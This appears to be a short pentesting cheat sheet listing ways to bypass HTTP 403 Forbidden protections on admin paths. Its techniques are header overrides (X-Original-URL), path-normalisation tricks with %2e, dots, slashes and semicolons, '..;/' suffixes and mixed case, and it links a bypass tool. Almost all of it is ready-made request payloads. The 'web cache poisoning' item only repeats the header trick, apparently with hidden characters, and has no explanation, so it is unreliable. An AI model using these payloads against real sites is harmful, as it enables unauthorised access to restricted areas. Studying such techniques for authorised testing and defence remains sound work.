# Bypass 403 (Forbidden)

1. Using "X-Original-URL" header
```
GET /admin HTTP/1.1
Host: target.com
```
Try this to bypass
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

2. Appending **%2e** after the first slash
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/%2e/admin => 200
```

3. Try add dot (.) slash (/) and semicolon (;) in the URL
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/secret/. => 200
http://target.com//secret// => 200
http://target.com/./secret/.. => 200
http://target.com/;/secret => 200
http://target.com/.;/secret => 200
http://target.com//;//secret => 200
```

4. Add "..;/" after the directory name
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/admin..;/
```


5. Try to uppercase the alphabet in the url
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/aDmIN
```

6. Via Web Cache Poisoning
```
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```

## Tools
* [Bypass-403 | Go script for bypassing 403 forbidden](https://github.com/daffainfo/bypass-403)

## References
- [@iam_j0ker](https://twitter.com/iam_j0ker)
- [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)
